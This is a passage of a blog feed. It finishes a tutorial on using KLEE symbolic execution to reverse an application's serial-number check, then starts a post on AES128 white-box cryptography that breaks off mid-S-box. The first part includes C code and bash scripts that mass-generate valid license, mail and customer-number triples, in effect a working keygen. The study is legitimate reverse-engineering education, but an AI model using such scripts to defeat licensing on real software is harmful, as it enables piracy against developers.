</span><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000023</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">mail</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">yrwt</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">&#39;</span>
</span><span class='line'><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, the mail found by KLEE is &ldquo;yrwt&rdquo;. This is not a mail, of course, but in the code there is not a proper validation imposing the presence of &lsquo;@&rsquo; and &lsquo;.&rsquo; chars, so we are fine with it :)</p>

<p>The last piece of the puzzle we need is the customer number. Here is the check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">expected_customer</span> <span class="o">=</span> <span class="n">compute_customer_number</span><span class="p">(</span><span class="n">serial</span><span class="p">,</span> <span class="n">mail</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">expected_customer</span> <span class="o">!=</span> <span class="n">customer_num</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">INVALID</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is simpler than before, since we already have a serial and a mail, so the only thing missing is a customer number matching those. We can compute it directly, even without symbolic execution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">mail</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">customer_number</span> <span class="o">=</span> <span class="n">compute_customer_number</span><span class="p">(</span><span class="n">serial</span><span class="p">,</span> <span class="n">mail</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">customer_number</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s execute it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">gcc</span> <span class="n">customer</span><span class="p">.</span><span class="n">c</span> <span class="n">customer</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">customer</span> <span class="mi">120300641</span> <span class="n">yrwt</span>
</span><span class='line'><span class="mi">1175211979</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yeah! And if we try those numbers and mail address onto the real program, we are now legit and registered users :)</p>

<h2>Want more keys?</h2>

<p>We have just found one key, and that&rsquo;s cool, but what about making a keygen? KLEE is deterministic, so if you run the same code over and over you will get always the same results. So, we are now stuck with this single serial.</p>

<p>To solve the problem we have to think about what variables we can move around to get different valid serial numbers to start with, and with them solve related mail addresses and compute a customer number.</p>

<p>We have to add constraints to the serial generation, so that every time we can run a slightly different version of the program and get a different serial number. The simplest thing to do is to constraint <code>get_index_in_mail_table</code> to return an index inside a proper subset of the range [0, <code>HEADER_SIZE</code>] used before. For example we can divide it in equal chunks of size 5 and run the whole thing for every chunk.</p>

<p>This is the modified version of the serial generation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="n">min_index</span><span class="p">,</span> <span class="n">max_index</span><span class="p">,</span> <span class="n">valid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// get chunk bounds as external inputs</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">min_index</span><span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">max_index</span><span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// check and assert</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">=</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">min_index</span> <span class="o">&amp;&amp;</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">max_index</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We now need a script that runs KLEE and collect the results for all those chunks. Here it is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="nv">MIN_INDEX</span><span class="o">=</span>0
</span><span class='line'><span class="nv">MAX_INDEX</span><span class="o">=</span>8033
</span><span class='line'><span class="nv">STEP</span><span class="o">=</span>5
</span><span class='line'>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Index;License;Mail;Customer&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for </span>INDEX in <span class="k">$(</span>seq <span class="nv">$MIN_INDEX</span> <span class="nv">$STEP</span> <span class="nv">$MAX_INDEX</span><span class="k">)</span>; <span class="k">do</span>
</span><span class='line'><span class="k">    </span><span class="nb">echo</span> -n <span class="s2">&quot;$INDEX;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">CHUNK_MIN</span><span class="o">=</span><span class="nv">$INDEX</span>
</span><span class='line'>    <span class="nv">CHUNK_MAX</span><span class="o">=</span><span class="k">$((</span> CHUNK_MIN <span class="o">+</span> STEP <span class="k">))</span>
</span><span class='line'>    <span class="nv">LICENSE</span><span class="o">=</span><span class="k">$(</span>./solve.sh serial.ll <span class="nv">$CHUNK_MIN</span> <span class="nv">$CHUNK_MAX</span><span class="k">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&quot;$LICENSE&quot;</span> <span class="o">]</span>; <span class="k">then</span>
</span><span class='line'><span class="k">        </span><span class="nb">echo</span> <span class="s2">&quot;;;&quot;</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'><span class="k">    fi</span>
</span><span class='line'><span class="k">    </span><span class="nv">MAIL_ARRAY</span><span class="o">=</span><span class="k">$(</span>./solve.sh mail.ll <span class="nv">$LICENSE</span><span class="k">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&quot;$MAIL_ARRAY&quot;</span> <span class="o">]</span>; <span class="k">then</span>
</span><span class='line'><span class="k">        </span><span class="nb">echo</span> <span class="s2">&quot;;;&quot;</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'><span class="k">    fi</span>
</span><span class='line'><span class="k">    </span><span class="nv">MAIL</span><span class="o">=</span><span class="k">$(</span>sed <span class="s1">&#39;s/\\x00//g&#39;</span> <span class="o">&lt;&lt;&lt;</span> <span class="nv">$MAIL_ARRAY</span> | sed <span class="s2">&quot;s/&#39;//g&quot;</span><span class="k">)</span>
</span><span class='line'>    <span class="nv">CUSTOMER</span><span class="o">=</span><span class="k">$(</span>./customer <span class="nv">$LICENSE</span> <span class="nv">$MAIL</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">echo</span> <span class="s2">&quot;$LICENSE;$MAIL;$CUSTOMER&quot;</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script uses the <code>solve.sh</code> script, that does the actual work and prints the result of KLEE runs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="c"># do work</span>
</span><span class='line'>klee <span class="nv">$@</span> &gt;/dev/null 2&gt;&amp;1
</span><span class='line'><span class="c"># print result</span>
</span><span class='line'><span class="nv">ASSERT_FILE</span><span class="o">=</span><span class="k">$(</span>ls klee-last | grep .assert.err<span class="k">)</span>
</span><span class='line'><span class="nv">TEST_FILE</span><span class="o">=</span><span class="k">$(</span>basename klee-last/<span class="nv">$ASSERT_FILE</span> .assert.err<span class="k">)</span>
</span><span class='line'><span class="nv">OUTPUT</span><span class="o">=</span><span class="k">$(</span>ktest-tool --write-ints klee-last/<span class="nv">$TEST_FILE</span>.ktest | grep data<span class="k">)</span>
</span><span class='line'><span class="nv">RESULT</span><span class="o">=</span><span class="k">$(</span>sed <span class="s1">&#39;s/.*:.*: //&#39;</span> <span class="o">&lt;&lt;&lt;</span> <span class="nv">$OUTPUT</span><span class="k">)</span>
</span><span class='line'><span class="nb">echo</span> <span class="nv">$RESULT</span>
</span><span class='line'><span class="c"># cleanup</span>
</span><span class='line'>rm -rf <span class="k">$(</span>readlink -f klee-last<span class="k">)</span>
</span><span class='line'>rm -f klee-last
</span></code></pre></td></tr></table></div></figure>


<p>Here is the final run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./keygen_all.sh
</span><span class='line'>Index;License;Mail;Customer
</span><span class='line'>...
</span><span class='line'>2400;;;
</span><span class='line'>2405;115019227;4h79;1162863222
</span><span class='line'>2410;112625605;7cxd;554797040
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>Note that not all the serial numbers are solvable, but we are OK with that. We now have a bunch of solved registrations. We can put them in some simple GUI that exposes to the user one of them randomly.</p>

<p>That&rsquo;s all folks.</p>

<h1>Conclusion</h1>

<p>This was a brief journey into the magic world of reversing and symbolic execution. We started with the dream to make a key generator for a real world application, and we&rsquo;ve got a list of serial numbers to put in some nice GUI (maybe with some MIDI soundtrack playing in the background to make users crazy). But this was not our purpose. The path we followed is far more interesting than ruining programmer&rsquo;s life. So, just to recap, here are the main steps we followed to generate our serial numbers:</p>

<ol>
<li>reverse the skeleton of the serial number validation procedure, understanding data and the most important functions, using a debugger, IDA, and all the reversing tools we can access;</li>
<li>collect the functions and produce a C version of them (this could be quite difficult, unless you have access to HEX-Rays decompiler or similar tool);</li>
<li>mark some strategic variable as symbolic and mark some strategic code path with an assert;</li>
<li>ask KLEE to provide us the values for symbolic variables that make the assert to fail, and so to reach that code path;</li>
<li>since the last step provides us only a single serial number, add an external input to the symbolic program, using it as additional constraint, in order to get different values for symbolic variables reaching the assert.</li>
</ol>


<p>The last point can be seen as quite obscure, I can admit that, but the idea is simple. Since KLEE&rsquo;s goal is to reach a path with some values for the symbolic variables, it is not interested in exploring all the possibilities for those values. We can force this exploration manually, by adding an additional constraint, and varying a parameter from run to run, and get (hopefully) different correct values for our serial number.</p>

<p>I would like to thank <a href="https://twitter.com/0vercl0k">@0vercl0k</a>, <a href="https://twitter.com/jonathansalwan">@jonathansalwan</a> and <a href="https://twitter.com/__x86">@__x86</a> for their careful proofreading and good remarks!</p>

<p>I hope you found this topic interesting. In the case, here are some links that can be useful for you to deepen some of the arguments touched in this post:</p>

<ul>
<li><a href="http://klee.github.io/">KLEE main site</a> in which you can find documentation, examples and some news;</li>
<li>My <a href="https://registry.hub.docker.com/u/mbrt/klee/">Docker image of KLEE</a> that you can use as is if you want to avoid building KLEE from sources. It is an automated build (sources <a href="https://github.com/mbrt/docker-klee">here</a>) so you can use it safely;</li>
<li>Tutorial on using KLEE onto <a href="http://www.gnu.org/software/coreutils/">GNU Coreutils</a> is <a href="http://klee.github.io/tutorials/testing-coreutils/">here</a> if you want to learn to use better KLEE for testing purposes.</li>
<li>The Feliam&rsquo;s article <a href="https://feliam.wordpress.com/2010/10/07/the-symbolic-maze/">The Symbolic Maze!</a> that gave me insights on how to use KLEE for reversing purposes;</li>
<li>The paper <a href="https://courses.engr.illinois.edu/cs477/king76symbolicexecution.pdf">Symbolic execution and program testing</a> of James C. King gives you a nice intro on symbolic execution topic;</li>
<li>Slides from this <a href="http://www.seas.harvard.edu/courses/cs252/2011sp/slides/Lec13-SymExec.pdf">Harvard course</a> are useful to visualize symbolic execution with nice figures and examples;</li>
<li><a href="http://shell-storm.org/talks/SecurityDay2015_dynamic_symbolic_execution_Jonathan_Salwan.pdf">Dynamic Binary Analysis and Instrumentation Covering a function using a DSE approach</a> by <a href="https://twitter.com/jonathansalwan">Jonathan Salwan</a>.</li>
</ul>


<p>Source code, examples and scripts used to produce this blog post are published in this <a href="https://github.com/mbrt/keygen-post">GitHub repo</a>.</p>

<p>Cheers, <a href="https://twitter.com/brt_device">@brt_device</a>.</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Spotlight on an unprotected AES128 white-box implementation]]></title>
    <link href="http://doar-e.github.io/blog/2015/02/08/spotlight-on-an-unprotected-aes128-whitebox-implementation/"/>
    
    <updated>2015-02-08T22:59:00-08:00</updated>
    <id>http://doar-e.github.io/blog/2015/02/08/spotlight-on-an-unprotected-aes128-whitebox-implementation</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>I think it all began when I&rsquo;ve worked on the <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2013">NSC2013</a> crackme made by <a href="https://twitter.com/elvanderb">@elvanderb</a>, long story short you had an AES128 heavily obfuscated white-box implementation to break. The thing was you could actually solve the challenge in different ways:</p>

<ol>
<li>the first one was the easiest one: you didn&rsquo;t need to know anything about white-box, crypto or even AES ; you could just see the function as a black-box &amp; try to find &ldquo;design flaws&rdquo; in its inner-workings</li>
<li>the elite way: this one involved to understand &amp; recover the entire design of the white-box, then to identify design weaknesses that allows the challenger to directly attack &amp; recover the encryption key. A really nice write-up has been recently written by <a href="https://twitter.com/doegox">@doegox</a>, check it out, really :): <a href="http://wiki.yobi.be/wiki/NSC_Writeups">Oppida/NoSuchCon challenge</a>.</li>
</ol>


<p>The annoying thing is that you don&rsquo;t have a lot of understandable available C code on the web that implement such things, nevertheless you do have quite some nice academic references ; they are a really good resource to build your own.</p>

<p>This post aims to present briefly, in a simple way what an AES white-box looks like, and to show how its design is important if you want to not have your encryption key extracted :). The implementation I&rsquo;m going to talk about today is not my creation at all, I just followed the first part (might do another post talking about the second part? Who knows) of a really <a href="https://github.com/0vercl0k/stuffz/raw/master/wbaes_attack/docs/a_tutorial_on_whitebox_aes.pdf">nice paper</a> (even for non-mathematical / crypto guys like me!) written by James A. Muir.</p>

<p>The idea is simple: we will start from a clean AES128 encryption function in plain C, we will modify it &amp; transform it into a white-box implementation in several steps.
As usual, all the code are available on my github account; you are encourage to break &amp; hack them!</p>

<p>Of course, we will use this post to briefly present what is the white-box cryptography, what are the goals &amp; why it&rsquo;s kind of cool.</p>

<p>Before diving deep, here is the table of contents:</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>AES128</h1>

<h2>Introduction</h2>

<p>All right, here we are: this part is just a reminder of how AES (with a 128 bits key) roughly works. If you know that already, feel free to go to the next level. Basically in here I just want us to build our first function: a simple block encryption. The signature of the function will be something, as you expect, like this:</p>

<figure class='code'><figcaption><span>aes128_enc_base signature</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="n">aes128_enc_base</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p>The encryption works in eleven rounds, the first one &amp; the last one are slightly different than the nine others ; but they all rely on four different operations. Those operations are called: AddRoundKey, SubBytes, ShiftRows, MixColumns. Each round modifies a 128 bits state with a 128 bits round-key. Those round-keys are generated from the encryption key after a key expansion (called key schedule) function. Note that the first round-key is actually the encryption key.</p>

<p>The first part of an AES encryption is to execute the key schedule in order to get our round-keys ; once we have them all it&rsquo;s just a matter of using the four different operations we saw to generate the encrypted plain-text.</p>

<p>I know that I quite like to see how crypto algorithms work in a visual way, if this is also your case check this SWF animation (no exploit in here, don&rsquo;t worry :)): <a href="http://www.formaestudio.com/rijndaelinspector/archivos/Rijndael_Animation_v4_eng.swf">Rijndael_Animation_v4_eng.swf</a> ; else you can also read the <a href="http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf">FIPS-197</a> document.</p>

<h2>Key schedule</h2>

<p>The key schedule is like the most important part of the algorithm. As I said a bit earlier, this function is a derivation one: it takes the encryption key as input and will generate the round-keys the encryption process will use as output.</p>

<p>I don&rsquo;t really feel like explaining in detail how it works (as it is a bit tricky to explain that with words), I would rather advise you to read the FIPS document or to follow the flash animation. Here is what my key schedule looks like:</p>

<figure class='code'><figcaption><span>aes key schedule</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">S_box</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span 